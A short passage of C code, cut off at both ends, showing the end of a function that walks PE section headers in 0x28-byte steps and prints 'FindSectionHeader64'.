			return (DWORD)(DWORD *)ish;

		ish = (IMAGE_SECTION_HEADER *)((DWORD)(DWORD *)ish + 0x28);
	}

	printf("FindSectionHeader64 \n");
	return (DWORD)(DWORD *)ish;
}